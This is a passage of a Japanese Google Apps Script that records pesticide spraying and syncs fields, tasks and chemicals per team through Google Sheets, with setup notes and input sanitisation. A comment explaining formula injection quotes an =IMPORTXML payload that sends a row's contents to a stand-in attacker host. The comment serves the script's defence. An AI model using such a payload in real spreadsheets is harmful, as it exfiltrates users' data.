// ════════════════════════════════════════════════════════
//  薬液調合ノート — 防除記録受信スクリプト v3(Google Apps Script)
//  ★1回の散布 = シート1行(薬剤は1つのセルにまとめて記載)
//
//  【新規設置】
//  1. Googleスプレッドシートを新規作成
//  2. 拡張機能 → Apps Script → このコードを貼り付けて保存
//  3. デプロイ → 新しいデプロイ → ウェブアプリ
//     (実行: 自分 ／ アクセス: 全員)
//  4. ウェブアプリのURL(…/exec)をアプリの設定に貼り付け
//
//  【農薬データ(chemdb.json)の置き場所】
//  アプリには農薬登録データを同梱していません(FAMICの利用規約により再配布しない
//  方針のため)。各自でデータを用意し、このスクリプト経由で端末に配ります。
//  1. リポジトリ直下で `python tools/update_chemdb.py` を実行し chemdb.json を作る
//     (できたファイルはリポジトリにコミットしないこと)
//  2. 自分のGoogleドライブに chemdb.json をアップロードする
//  3. そのファイルを開いたときのURL
//     https://drive.google.com/file/d/【ここがファイルID】/view
//     からファイルIDをコピーする
//  4. Apps Script の左メニュー「プロジェクトの設定」(歯車)→「スクリプト プロパティ」
//     → プロパティ名: CHEMDB_FILE_ID ／ 値: 手順3のファイルID → 保存
//     ※未設定の場合はドライブ内で "chemdb.json" という名前のファイルを探します。
//       同名ファイルが複数あると意図しないほうを掴むので、IDの設定を推奨します。
//  5. デプロイ → デプロイを管理 → 鉛筆 → バージョン「新バージョン」→ デプロイ
//  6. 各端末のアプリで 設定タブ →「農薬データ」→「⬇ 農薬データを取り込む」
//  取り込んだデータは端末内(IndexedDB)に保存されるので、以後は圏外でも検索できます。
//
//  【v2からの更新】
//  1. Apps Script のコードをこの内容に差し替えて保存
//  2. シート下部のタブ「防除記録」を右クリック → 名前を変更
//     (例:「防除記録_旧」)※旧形式のデータを残すため
//  3. デプロイ → デプロイを管理 → 鉛筆 → バージョン「新バージョン」→ デプロイ
//     (URLは変わらないので、スマホ側の再設定は不要)
//  次の受信時に、新しい1行形式の「防除記録」シートが自動で作られます。
//
//  【合言葉(SHARED_SECRET)の設定 ※強く推奨】
//  ウェブアプリのアクセスを「全員」にしている都合上、/exec のURLさえ
//  知られると、第三者が記録の追記・チーム共有データの読み出し/上書きを
//  実行できてしまいます。これを防ぐため、合言葉を設定してください。
//  1. Apps Script の左メニュー「プロジェクトの設定」(歯車)を開く
//  2. 「スクリプト プロパティ」→「スクリプト プロパティを追加」
//  3. プロパティ名: SHARED_SECRET ／ 値: 任意の長い文字列
//     (推測されにくいもの。例: 英数字20文字以上。パスワードの使い回しは避ける)
//  4. 「スクリプト プロパティを保存」を押す
//  5. アプリ側の設定画面の「合言葉」欄に、同じ文字列を入力する
//  ※未設定でも従来どおり動きます(既存の設置を壊さないため)。ただし
//    その場合はアプリの接続テストに「未設定です」と表示されます。
// ════════════════════════════════════════════════════════

const SHEET_NAME = "防除記録";

const HEADERS = [
  "受信日時",     // 1
  "記録ID",       // 2
  "散布日",       // 3
  "記録者",       // 4
  "圃場",         // 5
  "作物",         // 6
  "面積(a)",      // 7
  "薬剤数",       // 8
  "薬剤内容",     // 9  例: 薬剤A(フロアブル・10倍・1000mL) / 薬剤B(乳剤・16倍・625mL)
  "総量(L)",      // 10
  "水量(L)",      // 11
  "実散布量(L)",  // 12
  "状態",         // 13 調合済 / 散布済
  "報告日",       // 14
  "備考",         // 15
  // 末尾に足している。先頭に挿すと既存シートの全列がずれ、設置済みの
  // スプレッドシートを手で直すことになる。台帳は人が読む表なので、
  // 他シート(圃場マスタ・作業)の列1と位置が揃わないのは許容する。
  "チームコード", // 16
];
const COL = {
  ID: 2, AREA: 7, CHEM_N: 8, CHEM_TEXT: 9, TOTAL: 10, WATER: 11,
  SPRAYED: 12, STATUS: 13, REPORT_DATE: 14, MEMO: 15, TEAM: 16,
};

// ── セルに書く文字列を「数式ではない」ものとして固定する ──
// 圃場名や備考にそのまま任せると、= や + で始まる文字列がスプレッドシート側で
// 数式として評価されてしまう(数式インジェクション)。たとえば
//   =IMPORTXML("https://攻撃者/?d="&TEXTJOIN(",",1,A2:O2),"//x")
// と入力された記録を1行追記しただけで、その行の中身が外部へ送信される。
// 先頭にアポストロフィを付けると、Sheetsは以降を必ず文字列として扱う
// (画面上・CSV出力ともアポストロフィは表示されない)。
// タブ・改行始まりも、前方の空白が無視されて数式と判定されうるので同じ扱いにする。
function safeCell_(v) {
  if (v === null || v === undefined) return "";
  if (typeof v === "number" || typeof v === "boolean" || v instanceof Date) return v;
  const s = String(v);
  return /^[=+\-@\t\r\n]/.test(s) ? "'" + s : s;
}

// ── 合言葉(スクリプトプロパティ SHARED_SECRET)の照合 ──
// 未設定なら null を返す。呼び出し側はその場合、従来どおり素通しする。
function sharedSecret_() {
  const s = PropertiesService.getScriptProperties().getProperty("SHARED_SECRET");
  return s ? String(s) : null;
}

// 定数時間に近い比較。=== は先頭が違った時点で false を返すため、応答時間の差から
// 1文字ずつ合言葉を当てられる余地がある(GASは呼び出しごとの揺らぎが大きく現実的な
// 脅威ではないが、比較の書き方としてこちらを既定にする)。
// 長さの違いだけは隠せないので、短いほうを空文字で埋めて必ず全文字を走査する。
function secretEquals_(a, b) {
  const x = String(a == null ? "" : a);
  const y = String(b == null ? "" : b);
  const n = Math.max(x.length, y.length);
  let diff = x.length ^ y.length;
  for (let i = 0; i < n; i++) {
    diff |= (x.charCodeAt(i) || 0) ^ (y.charCodeAt(i) || 0);
  }
  return diff === 0;
}

// 見出しは掴むたびに現行 HEADERS と突き合わせる。列を足した版へ差し替えたとき、
// 古い見出しのまま新しい幅で書くと見出しと中身がずれる(getRecSheet_ と同じ理由)。
// 直すのは見出し行だけで、データ行には触らない。
function getSheet_() {
  const ss = SpreadsheetApp.getActiveSpreadsheet();
  let sh = ss.getSheetByName(SHEET_NAME);
  if (!sh) sh = ss.insertSheet(SHEET_NAME);
  if (sh.getLastRow() === 0) {
    sh.appendRow(HEADERS);
    sh.getRange(1, 1, 1, HEADERS.length).setFontWeight("bold").setBackground("#EDF5EE");
    sh.setFrozenRows(1);
    return sh;
  }
  const cur = sh.getRange(1, 1, 1, HEADERS.length).getValues()[0];
  let same = true;
  for (let i = 0; i < HEADERS.length; i++) {
    if (String(cur[i]) !== HEADERS[i]) { same = false; break; }
  }
  if (!same) {
    sh.getRange(1, 1, 1, HEADERS.length).setValues([HEADERS])
      .setFontWeight("bold").setBackground("#EDF5EE");
    sh.setFrozenRows(1);
  }
  return sh;
}

// 散布日ごとに行の背景色を塗り分ける(同じ散布日は同色、日付が変わると色が切り替わる)
const DATE_COLORS = [
  "#FFFFFF", // 白
  "#EAF4EA", // 薄緑
  "#FDF3E0", // 薄オレンジ
  "#E8F1FA", // 薄青
  "#F6ECF6", // 薄紫
];

function colorByDate_(sh) {
  const last = sh.getLastRow();
  if (last < 2) return;
  const n = last - 1;
  const dates = sh.getRange(2, 3, n, 1).getValues(); // 3列目 = 散布日
  const colorOf = {};   // 散布日 → 色
  let next = 0;         // 次に割り当てる色の番号
  const bg = [];
  for (let i = 0; i < n; i++) {
    const v = dates[i][0];
    const key = (v instanceof Date)
      ? Utilities.formatDate(v, "Asia/Tokyo", "yyyy-MM-dd")
      : String(v || "");
    if (!(key in colorOf)) {
      colorOf[key] = DATE_COLORS[next % DATE_COLORS.length];
      next++;
    }
    const c = colorOf[key];
    bg.push(new Array(HEADERS.length).fill(c));
  }
  sh.getRange(2, 1, n, HEADERS.length).setBackgrounds(bg);
}

// 既存の全行を塗り直す(GASエディタから手動実行)
function recolorAll() {
  colorByDate_(getSheet_());
}

// 旧レイアウトのヘッダー行を現行HEADERSに貼り直す(GASエディタから1回だけ手動実行)
function fixHeaders() {
  const sh = SpreadsheetApp.getActiveSpreadsheet().getSheetByName(SHEET_NAME);
  if (!sh) throw new Error("シートがありません: " + SHEET_NAME);
  const lastCol = Math.max(sh.getLastColumn(), HEADERS.length);
  sh.getRange(1, 1, 1, lastCol).clearContent();
  sh.getRange(1, 1, 1, HEADERS.length).setValues([HEADERS])
    .setFontWeight("bold").setBackground("#EDF5EE");
  sh.setFrozenRows(1);
}

// 指定した記録IDの行番号を返す(なければ0)。
//
// 探す鍵は「記録ID＋チームコード」。IDだけで探すと、別のチームが同じ日に
// 同じ圃場を入れたとき同じ記録IDになり(作業IDは v8.73 から日付＋圃場IDで
// 決まる)、互いの行を上書きし合う。台帳(圃場マスタ・作業)は upsertRows_ で
// 既にチーム＋IDで分けているが、防除記録シートだけ列が無く取り残されていた。
//
// チーム欄が空の行は v8.84 以前に書かれたもので、どのチームのものか判別できない。
// 拾えないと report / unreport が既存行を見つけられず二重行になるため、
// 第2段として拾う。拾った側が呼び出し元でチームを書き戻し、以後は正しく分かれる。
// 別チームが同じ記録IDを持っていた場合は先に触ったほうがその行を取るが、
// これは v8.84 までと同じ挙動で、情報が無い以上これ以上は詰められない。
//
// team が空(チーム未設定、または team を送らない旧アプリ)のときはIDだけで探す。
// 旧アプリ × 新GAS の組み合わせを壊さないため。
function findRow_(sh, recordId, team) {
  if (sh.getLastRow() < 2) return 0;
  const n = sh.getLastRow() - 1;
  const ids = sh.getRange(2, COL.ID, n, 1).getValues();
  const t = String(team == null ? "" : team);
  if (!t) {
    for (let i = 0; i < n; i++) {
      if (String(ids[i][0]) === String(recordId)) return i + 2;
    }
    return 0;
  }
  const teams = sh.getRange(2, COL.TEAM, n, 1).getValues();
  let legacy = 0;
  for (let i = 0; i < n; i++) {
    if (String(ids[i][0]) !== String(recordId)) continue;
    const rt = String(teams[i][0] == null ? "" : teams[i][0]);
    if (rt === t) return i + 2;
    if (!rt && !legacy) legacy = i + 2;
  }
  return legacy;
}

// チーム欄が空の行に、いま送ってきたチームを書き入れる。
// findRow_ が第2段で拾った行を、その場で移行するための後始末。
function claimRow_(sh, row, team) {
  const t = String(team == null ? "" : team);
  if (!t || row <= 0) return;
  if (String(sh.getRange(row, COL.TEAM).getValue() || "")) return;
  sh.getRange(row, COL.TEAM).setValue(safeCell_(t));
}

// チーム共有データ用のシート(チームコード / データ / 保存日時 / 保存者)
function getShareSheet_() {
  const ss = SpreadsheetApp.getActiveSpreadsheet();
  let sh = ss.getSheetByName("_共有データ");
  if (!sh) {
    sh = ss.insertSheet("_共有データ");
    sh.appendRow(["チームコード", "データ", "保存日時", "保存者"]);
    sh.getRange(1, 1, 1, 4).setFontWeight("bold").setBackground("#EAF3FA");
    sh.setFrozenRows(1);
  }
  return sh;
}
// 共有データの上書き履歴シート。cloudSave は1チーム1行を丸ごと置き換えるため、
// 誤操作や古い端末からの保存で、他の人が入れた圃場・薬剤が一瞬で消えうる。
// 上書き直前の値をここに積んでおけば、コピーして戻すだけで復旧できる。
const SHARE_LOG_NAME = "_共有データ履歴";
// 削除済みの行を残しておく日数。
// 墓標(削除の印)は、他の端末が受け取るまで残しておく必要がある。
// 早く捨てると、長く同期していない端末に削除が伝わらず、
// その端末が古い作業を押し戻す。逆に残しすぎると行が増え続ける。
// 30日 = 「1シーズンの間に一度も開かない端末はない」という前提。
// この前提が崩れる使い方になったら伸ばすこと。
const TOMB_KEEP_DAYS = 30;
const SHARE_LOG_MAX = 200; // これを超えたら古い行から捨てる(シートの肥大化を防ぐ)

function getShareLogSheet_() {
  const ss = SpreadsheetApp.getActiveSpreadsheet();
  let sh = ss.getSheetByName(SHARE_LOG_NAME);
  if (!sh) {
    sh = ss.insertSheet(SHARE_LOG_NAME);
    sh.appendRow(["保存日時", "チームコード", "保存者", "直前のデータ"]);
    sh.getRange(1, 1, 1, 4).setFontWeight("bold").setBackground("#F3EEE6");
    sh.setFrozenRows(1);
  }
  return sh;
}

// 上書き前の値を1行残す。prev が空(初回保存)なら記録しない。
function pushShareLog_(team, by, prev, when) {
  if (!prev) return;
  const sh = getShareLogSheet_();
  sh.appendRow([when, safeCell_(team), safeCell_(by), safeCell_(prev)]);
  const over = (sh.getLastRow() - 1) - SHARE_LOG_MAX; // 1行目はヘッダー
  if (over > 0) sh.deleteRows(2, over); // 2行目 = いちばん古い履歴
}

// チームコードの行番号を返す(なければ0)
function findShareRow_(sh, team) {
  if (sh.getLastRow() < 2) return 0;
  const teams = sh.getRange(2, 1, sh.getLastRow() - 1, 1).getValues().flat();
  for (let i = 0; i < teams.length; i++) {
    if (String(teams[i]) === String(team)) return i + 2;
  }
  return 0;
}

// ══════════ 進捗共有:圃場・作業を「1件1行」で持つ ══════════
// 旧 cloudSave は 1チーム=1セルにJSON全体を詰め、丸ごと置き換える方式だった。
// この方式だと次の3つが同時に起きる。
//   (1) 誰かの保存が、他の人が入れた実績をまとめて消す(last-write-wins)
//   (2) 1セル上限に当たり、圃場を増やすと保存できなくなる(45,000文字で断っている)
//   (3) 他の端末の進捗を読む手段がない
// 進捗マップは(3)が要るので、レコード単位の表に作り直す。
// 旧方式(cloudSave / cloudLoad)は残す。並行稼働させて段階的に移行するため。

const FIELD_SHEET = "圃場マスタ";
const WORK_SHEET = "作業";

// ── 「編集日時」と「更新日時」を分けている理由 ──
// 編集日時 = その端末が値を書き換えた時刻(アプリが付ける)。競合の勝ち負けに使う。
// 更新日時 = サーバーが行を書いた時刻(GASが付ける)。差分取得(since)に使う。
// 1つにまとめると、pull した端末が次に push したとき「サーバーが付けた時刻」を
// 編集時刻として送り返すことになり、自分の更新が常に最新と判定されて
// 他人の変更を踏み潰す。逆に編集日時だけにすると、時計のずれた端末の行が
// since の範囲から漏れて永久に配られない。用途が違うので列を分ける。
const FIELD_HEADERS = [
  "圃場ID",   // 0
  "チームコード", // 1
  "名称",     // 2
  "作物",     // 3
  "地区",     // 4
  "面積a",    // 5
  "中心lat",  // 6
  "中心lng",  // 7
  "ポリゴン", // 8  座標配列のJSON
  "編集日時", // 9  端末が付けた時刻(ISO)
  "更新日時", // 10 サーバーが付けた時刻(ISO)
  "更新者",   // 11
  "更新端末", // 12
  "削除",     // 13 論理削除
];
const FIELD_ID_COL = 0, FIELD_EDIT_COL = 9, FIELD_AT_COL = 10;

const WORK_HEADERS = [
  "作業ID",     // 0
  "チームコード", // 1
  "作業日",     // 2
  "圃場ID",     // 3
  "圃場名",     // 4
  "状態",       // 5  planned / mixed / done
  "予定L",      // 6
  "実績L",      // 7
  "実績面積a",  // 8
  "薬剤数",     // 9
  "薬剤内容",   // 10
  "記録者",     // 11
  "更新端末",   // 12
  "実績入力日時", // 13
  "編集日時",   // 14
  "更新日時",   // 15
  "削除",       // 16
  // ここからは v8.58 で追加。作業を「その日の予定」として
  // 他の端末へ配るには、進捗マップ用の要約だけでは足りない。
  // 列は末尾に足す。途中に入れると、既存の行の値が列ごとずれる。
  "作物",     // 17
  "面積a",    // 18
  "薬剤JSON", // 19 希釈倍率まで含む中身(表示用は「薬剤内容」列)
  "総量L",    // 20
  "水量mL",   // 21
  "備考",     // 22
  "並び順", // 23 その日の中での位置
  // v9.04 で追加。台帳(防除記録)の「備考」は、散布済のときは実績メモを使う。
  // 作業シートにこの列が無いと、台帳を作業シートから作り直せない(提案D)。
  // 末尾に足すこと。途中に入れると既存の行の値が列ごとずれる。
  "実績メモ", // 24
];
const WORK_ID_COL = 0, WORK_EDIT_COL = 14, WORK_AT_COL = 15;

// 薬剤マスタ。ID は「薬剤名を正規化した文字列」で、アプリ側が付ける。
// 圃場・作業は数字のIDを持つが、薬剤はもともと名前が主キーで、
// 同じ薬剤を別のIDで二重登録させないために名前をそのままIDにする。
const CHEM_SHEET = "薬剤マスタ";
const CHEM_HEADERS = [
  "薬剤ID",   // 0  正規化した薬剤名
  "チームコード", // 1
  "薬剤名",   // 2
  "種類",     // 3  fungicide / insecticide など
  "剤型",     // 4  sc / wp など
  "使用回数の上限", // 5
  "編集日時", // 6  端末が付けた時刻(ISO)
  "更新日時", // 7  サーバーが付けた時刻(ISO)
  "更新者",   // 8
  "更新端末", // 9
  "削除",     // 10 論理削除
];
const CHEM_ID_COL = 0, CHEM_EDIT_COL = 6, CHEM_AT_COL = 7;

// 1回の push で受け付ける最大件数。GASの実行時間(6分)に当たる前に断る。
// 超えたぶんはアプリ側が分割して送り直す。無言で切り捨てない。
const PUSH_MAX = 300;

// ── pull が返す基準時刻を、どれだけ手前にずらすか ──
//
// 押し込み(upsertRows_)は行を組み立てる前に更新日時 at を採り、そのあと
// ensureRows_ と setValues を通ってから実際にシートへ載る。この間に別の端末が
// pull で基準時刻を採って読み終えると、その行は「at は基準時刻より古いのに、
// 読んだ時点ではまだシートに無い」状態をすり抜ける。pull した端末は基準時刻を
// 保存して次回そこから先だけを求めるので、その行は永久に配られない。
// 静かな取りこぼしで、消えたことに気づく手立てがない。
//
// pull は doRead_ でロックを取らずに走るため(そのぶん読みが速い)、この重なりは
// 排除されていない。ロックを取らせる案もあったが、pull が他端末の送信を待って
// busy を返すようになり、電波の悪い現場で新しい失敗モードが増える。
//
// 代わりに、返す基準時刻を「今より少し手前」にする。書き込み中だった行は
// 次回もう一度配られる。マージは冪等(編集日時で勝ち負けを決める)なので
// 二度配られても害はない。
//
// 上限つきの保証である点に注意する。at を採ってから setValues がシートに
// 載るまでがこの幅を超えて長引けば、依然として取りこぼす。実測はしていない。
// 幅を広げるほど安全になるが、毎回配り直す行が増える。
const PULL_LAG_MS = 120000;   // 2分

// 更新日時は ISO8601 の文字列で持つ。Date のまま入れるとシートのタイムゾーンや
// 表示形式に引きずられ、差分取得(since より新しい行)の比較がずれる。
// ISO文字列なら辞書順の比較がそのまま時刻の比較になる。
// セルの値を "yyyy-MM-dd" の文字列に戻す。
// スプレッドシートは "2026-08-26" のような文字列を入れると日付として
// 解釈し、読み戻すと Date で返す。そのまま String() すると
// "Wed Aug 26 2026 00:00:00 GMT+0900" になり、アプリ側の
// 「その日の作業(workDate === 選んでいる日)」と一致しなくなる。
// 刃味は「本日の作業圃場が一覧から消える」という形で出る。
function ymd_(v) {
  if (v instanceof Date) return Utilities.formatDate(v, "Asia/Tokyo", "yyyy-MM-dd");
  const s = String(v || "").trim();
  if (!s) return "";
  if (/^\d{4}-\d{2}-\d{2}$/.test(s)) return s;
  // "Wed Aug 26 2026 ..." や ISO 文字列で戻ってきた場合も拾う
  const d = new Date(s);
  if (isNaN(d.getTime())) return s;
  return Utilities.formatDate(d, "Asia/Tokyo", "yyyy-MM-dd");
}

// シートの行数を確保する。
//
// シートの行数は新規作成時に1000行。その外を getRange で掴むと
// "Those rows are out of bounds" で例外になり、その送信が丸ごと落ちる。
// 進捗の送信は「新しい作業＋削除の墓標」を1回で送るので、満杯になると
// 削除まで一緒に失敗し、進捗地図が赤いまま戻らなくなる。
// 実データが 999行/1000行 まで埋まってこの状態になっていた。
// 伸ばすときは余裕を持たせる。毎回1行ずつ増やすと遅い。
function ensureRows_(sh, need) {
  const have = sh.getMaxRows();
  if (need <= have) return;
  sh.insertRowsAfter(have, (need - have) + 500);
}

function isoNow_() {
  return new Date().toISOString();
}

// 更新日時セルの値を ISO 文字列に戻す。
// ISO を書き込んでも、書式が固定されていない列ではシートが日付として解釈し、
// 読み戻すと Date で返る。そのまま String() すると "Wed Aug 26 2026 ..." になり、
// ISO 文字列との辞書順比較が壊れる("W" > "2" なので、常に「新しい」と判定される)。
// 取りこぼしではなく配り過ぎになるので害は軽いが、since の絞り込みがその行だけ
// 効かなくなる。掃除の側では対処していたのに pullRows_ が素通しだった(v8.85)。
function atIso_(v) {
  if (v instanceof Date) return v.toISOString();
  return String(v == null ? "" : v);
}

// ヘッダー行を現行の定義に合わせる。列を増やした版へ差し替えたとき、
// 古いヘッダーのまま新しい幅で書き込むと見出しと中身がずれるため、
// シートを掴むたびに幅だけ確認する。
function getRecSheet_(name, headers, headBg) {
  const ss = SpreadsheetApp.getActiveSpreadsheet();
  let sh = ss.getSheetByName(name);
  if (!sh) sh = ss.insertSheet(name);
  if (sh.getLastRow() === 0) {
    sh.appendRow(headers);
    sh.getRange(1, 1, 1, headers.length).setFontWeight("bold").setBackground(headBg);
    sh.setFrozenRows(1);
    return sh;
  }
  const cur = sh.getRange(1, 1, 1, headers.length).getValues()[0];
  let same = true;
  for (let i = 0; i < headers.length; i++) {
    if (String(cur[i]) !== headers[i]) { same = false; break; }
  }
  if (!same) {
    sh.getRange(1, 1, 1, headers.length).setValues([headers])
      .setFontWeight("bold").setBackground(headBg);
    sh.setFrozenRows(1);
  }
  return sh;
}
// 作業シートの日付列は、シート側に日付として解釈させない。
// 読み戻しは ymd_ でも直せるが、そもそも文字列のまま置いておく方が安全。
// 表示上も "2026-08-26" のままで、ロケールで揺れない。
// 1始まりの列番号。作業日(3) / 実績入力日時(14) / 編集日時(15) / 更新日時(16)。
// 14 は v8.97 で追加。これまで抜けており、入れた日付がシート側で Date に
// 変換されていた(吹き出しに "Thu Aug 27 2026 ..." が出ていたのはこれ)。
// 刻まで入った ISO を置くには、文字列のまま保たないとタイムゾーンがずれる。
const WORK_TEXT_COLS = [3, 14, 15, 16, 25];
// 圃場マスタと薬剤マスタにも同じ手当てが要る。編集日時・更新日時は ISO 文字列だが、
// 書式が固定されていないとシートが日付として解釈して Date で返す。
// atIso_ が読み側で吸収するようになったが、そもそも化けさせない方が確実(1始まり)。
const FIELD_TEXT_COLS = [10, 11];    // 編集日時 / 更新日時
const CHEM_TEXT_COLS  = [7, 8];      // 編集日時 / 更新日時

// 指定した列を文字列書式に固定する。一度だけではなく毎回当てる。
// 列を増やした版へ差し替えたときや、手でシートを作り直したときに抜けるのを防ぐ。
function forceTextCols_(sh, cols) {
  cols.forEach(function (c) {
    sh.getRange(1, c, sh.getMaxRows() || 1000, 1).setNumberFormat("@");
  });
}

function getFieldSheet_() {
  const sh = getRecSheet_(FIELD_SHEET, FIELD_HEADERS, "#EDF5EE");
  forceTextCols_(sh, FIELD_TEXT_COLS);
  return sh;
}
function getWorkSheet_()  {
  const sh = getRecSheet_(WORK_SHEET, WORK_HEADERS, "#EAF3FA");
  forceTextCols_(sh, WORK_TEXT_COLS);
  return sh;
}
function getChemSheet_()  {
  const sh = getRecSheet_(CHEM_SHEET, CHEM_HEADERS, "#F3EEF8");
  forceTextCols_(sh, CHEM_TEXT_COLS);
  return sh;
}

// ── 圃場1件 → 行 ──
// 文字列はすべて safeCell_ を通す。圃場名・地区はユーザーの自由入力で、
// "=" 始まりだとシート側で数式として評価される(数式インジェクション)。
function fieldRow_(f, team, at) {
  const c = Array.isArray(f.center) ? f.center : [];
  return [
    String(f.id),
    safeCell_(team),
    safeCell_(f.name || ""),
    safeCell_(f.crop || ""),
    safeCell_(f.area || ""),
    Number(f.areaA) || "",
    Number(c[0]) || "",
    Number(c[1]) || "",
    safeCell_(JSON.stringify(f.polygon || [])),
    safeCell_(String(f.updatedAt || "")),
    at,
    safeCell_(f.by || ""),
    safeCell_(f.deviceId || ""),
    f.deleted ? 1 : "",
  ];
}

function fieldObj_(r) {
  // ポリゴンが壊れていても、その圃場1件を落とすだけで済ませる。
  // ここで例外を投げると pull 全体が失敗し、他の圃場まで配られなくなる。
  let poly = [];
  try {
    const raw = String(r[8] || "");
    if (raw) poly = JSON.parse(raw);
  } catch (err) {
    poly = [];
  }
  const lat = r[6], lng = r[7];
  return {
    id: Number(r[0]),
    name: String(r[2] || ""),
    crop: String(r[3] || ""),
    area: String(r[4] || ""),
    areaA: r[5] === "" ? "" : Number(r[5]),
    center: (lat === "" || lng === "") ? null : [Number(lat), Number(lng)],
    polygon: Array.isArray(poly) ? poly : [],
    updatedAt: String(r[FIELD_EDIT_COL] || ""),
    serverAt: atIso_(r[FIELD_AT_COL]),
    by: String(r[11] || ""),
    deleted: !!r[13],
  };
}

// ── 作業1件 → 行 ──
function workRow_(w, team, at) {
  return [
    String(w.id),
    safeCell_(team),
    safeCell_(w.workDate || ""),
    String(w.fieldId),
    safeCell_(w.fieldName || ""),
    safeCell_(w.status || "planned"),
    Number(w.plannedL) || "",
    Number(w.sprayedL) || "",
    Number(w.reportAreaA) || "",
    Number(w.chemCount) || 0,
    safeCell_(w.chemText || ""),
    safeCell_(w.by || ""),
    safeCell_(w.deviceId || ""),
    safeCell_(String(w.reportedAt || "")),
    safeCell_(String(w.updatedAt || "")),
    at,
    w.deleted ? 1 : "",
    safeCell_(w.crop || ""),
    Number(w.areaA) || "",
    // ポリゴンと同じやり方でJSONのまま置く。列に分けると
    // 薬剤の数だけ列が必要になり、上限が決められない。
    safeCell_(JSON.stringify(Array.isArray(w.chems) ? w.chems : [])),
    Number(w.totalL) || "",
    Number(w.waterMl) || "",
    safeCell_(w.memo || ""),
    (w.seq === 0 || Number(w.seq)) ? Number(w.seq) : "",
    safeCell_(w.reportMemo || ""),
  ];
}

function workObj_(r) {
  return {
    id: Number(r[0]),
    workDate: ymd_(r[2]),
    fieldId: Number(r[3]),
    fieldName: String(r[4] || ""),
    status: String(r[5] || "planned"),
    plannedL: r[6] === "" ? 0 : Number(r[6]),
    sprayedL: r[7] === "" ? 0 : Number(r[7]),
    reportAreaA: r[8] === "" ? "" : Number(r[8]),
    chemCount: Number(r[9]) || 0,
    chemText: String(r[10] || ""),
    by: String(r[11] || ""),
    reportedAt: ymd_(r[13]),
    // 刻まで入った形。先後の判定に使うので丸めずに返す(v8.97)
    reportedAtTime: atIso_(r[13]),
    updatedAt: String(r[WORK_EDIT_COL] || ""),
    serverAt: atIso_(r[WORK_AT_COL]),
    deleted: !!r[16],
    crop: String(r[17] || ""),
    areaA: r[18] === "" ? "" : Number(r[18]),
    // 壊れていたら空の配列にする。ここで例外を投げると
    // 1行のせいで pull 全体が落ち、他の行も配られなくなる。
    chems: parseJsonArray_(r[19]),
    totalL: r[20] === "" ? 0 : Number(r[20]),
    waterMl: r[21] === "" ? 0 : Number(r[21]),
    memo: String(r[22] || ""),
    seq: r[23] === "" ? "" : Number(r[23]),
    // v9.04。古いシートにはこの列が無く undefined になるので、空に寄せる
    reportMemo: String(r[24] == null ? "" : r[24]),
  };
}

function parseJsonArray_(v) {
  if (!v) return [];
  try {
    const a = JSON.parse(String(v));
    return Array.isArray(a) ? a : [];
  } catch (e) {
    return [];
  }
}

// ── 薬剤1件 → 行 ──
function chemRow_(c, team, at) {
  return [
    safeCell_(String(c.id)),
    safeCell_(team),
    safeCell_(c.name || ""),
    safeCell_(c.use || ""),
    safeCell_(c.form || ""),
    Number(c.maxUse) || "",
    safeCell_(String(c.updatedAt || "")),
    at,
    safeCell_(c.by || ""),
    safeCell_(c.deviceId || ""),
    c.deleted ? 1 : "",
  ];
}

function chemObj_(r) {
  return {
    id: String(r[0]),
    name: String(r[2] || ""),
    use: String(r[3] || ""),
    form: String(r[4] || ""),
    maxUse: r[5] === "" ? "" : Number(r[5]),
    updatedAt: String(r[CHEM_EDIT_COL] || ""),
    serverAt: atIso_(r[CHEM_AT_COL]),
    deleted: !!r[10],
  };
}

// ── 上書き前の値を履歴シートへ退避する ──
// 圃場だけを対象にしている。圃場のポリゴンは現場で1枚ずつ手で囲んだもので、
// 消えると囲み直すしかない。作業は日ごとに作られ、確定した内容は「防除記録」
// シートにも残るため、ここで二重に積むとログが作業で埋まって
// 肝心の圃場の履歴が SHARE_LOG_MAX で押し出される。
function pushRecLogs_(logs) {
  if (!logs.length) return;
  const sh = getShareLogSheet_();
  const start = sh.getLastRow() + 1;
  ensureRows_(sh, start + logs.length - 1);
  sh.getRange(start, 1, logs.length, 4).setValues(logs);
  const over = (sh.getLastRow() - 1) - SHARE_LOG_MAX;
  if (over > 0) sh.deleteRows(2, over);
}

// ── upsert:IDが一致する行は上書き、無ければ追記 ──
//
// 上書きするかどうかは「編集日時」の比較で決める。後から届いたほうが必ず勝つ、
// にはしない。圏外に長く居た端末が電波復帰時に古い内容を送り返してきたとき、
// 新しい実績を巻き戻してしまうため。編集日時が空(旧版の端末)のときだけ、
// 判定材料が無いので素通しする。
//
// 書き込みは最後に1回の setValues でまとめる。1行ずつ setValue を呼ぶと
// 件数ぶんラウンドトリップが発生し、初回の一括投入で6分制限に当たる。
function upsertRows_(sh, headers, idCol, editCol, incoming, toRow, team, logKind) {
  const width = headers.length;
  const last = sh.getLastRow();
  const rows = last >= 2 ? sh.getRange(2, 1, last - 1, width).getValues() : [];

  // TOMB_KEEP_DAYS より古い削除済みの行を捨てる。
  // 削除しても行は残る(墓標)ので、放っておくと増え続ける。
  // 実データでは 999行中 354行が中身の空いた削除済みの行だった。
  // 鍵を作る前に捨てる。あとで捨てると idx の添字がずれる。
  const delCol = headers.indexOf("削除");
  const atCol = headers.indexOf("更新日時");
  let purged = 0;
  if (delCol >= 0 && atCol >= 0) {
    const limit = new Date(Date.now() - TOMB_KEEP_DAYS * 86400000).toISOString();
    const kept = [];
    for (let i = 0; i < rows.length; i++) {
      const r = rows[i];
      // 更新日時はシート側で Date に化けることがある。ISO に揃えてから比べる
      const iso = atIso_(r[atCol]);
      if (r[delCol] && iso && iso < limit) { purged++; continue; }
      kept.push(r);
    }
    if (purged > 0) rows.length = 0, Array.prototype.push.apply(rows, kept);
  }

  // 行を探す鍵は「チーム＋ID」。IDだけで探すと、
  // チームの違う行を上書きしてしまう。
  //  ・端末のチームコードを変えてから作業を触ると、前のチームの行が
  //    新しいチームへ移ってしまう(実測で確認)
  //  ・作業IDは v8.73 から「日付＋圃場ID」で決まるので、別のチームが
  //    同じ日に同じ圃場を入れるとIDが一致し、互いに消し合う
  // チームコードはどのシートも列 1。
  const TEAM_COL = 1;
  const keyOf_ = (t, id) => String(t == null ? "" : t) + "\u241F" + String(id);
  const idx = {};
  for (let i = 0; i < rows.length; i++) idx[keyOf_(rows[i][TEAM_COL], rows[i][idCol])] = i;

  const at = isoNow_();
  const logs = [];
  let updated = 0, added = 0, skipped = 0;

  for (let k = 0; k < incoming.length; k++) {
    const item = incoming[k];
    if (!item || item.id === undefined || item.id === null || item.id === "") {
      skipped++;
      continue;
    }
    const key = keyOf_(team, item.id);
    const values = toRow(item, team, at);
    if (key in idx) {
